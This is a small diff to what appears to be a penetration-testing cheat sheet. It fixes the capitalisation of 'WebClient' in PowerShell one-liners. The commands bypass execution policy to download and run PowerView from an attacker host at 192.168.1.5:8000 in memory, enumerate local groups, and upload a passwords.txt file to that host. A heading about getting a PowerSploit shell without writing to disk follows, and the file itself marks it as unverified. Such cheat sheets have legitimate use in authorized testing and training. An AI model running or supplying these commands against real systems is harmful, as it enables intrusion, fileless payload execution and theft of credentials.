@@ -7,7 +7,7 @@ python -m SimpleHTTPServer
 
 - Windows
 cd to a discrete, writable directory (C:\Users\<user>\Desktop)
-powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.1.5:8000/PowerView.ps1', 'PowerView.ps1')"
+powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadFile('http://192.168.1.5:8000/PowerView.ps1', 'PowerView.ps1')"
 powershell.exe -nop -exec bypass
 Import-Module .\PowerView.ps1
 
@@ -15,7 +15,7 @@ Import-Module .\PowerView.ps1
 powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:8000/PowerView.ps1');Get-NetLocalGroup"
 
 # Upload a file
-powershell -nop -exec bypass "IEX (New-Object Net.Webclient).UploadString('http://192.168.1.5/passwords.txt',"<PostDATA>")"
+powershell -nop -exec bypass "IEX (New-Object Net.WebClient).UploadString('http://192.168.1.5/passwords.txt',"<PostDATA>")"
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # PowerSploit - getting a shell without writing to disk     *** NEED to VERIFY ***
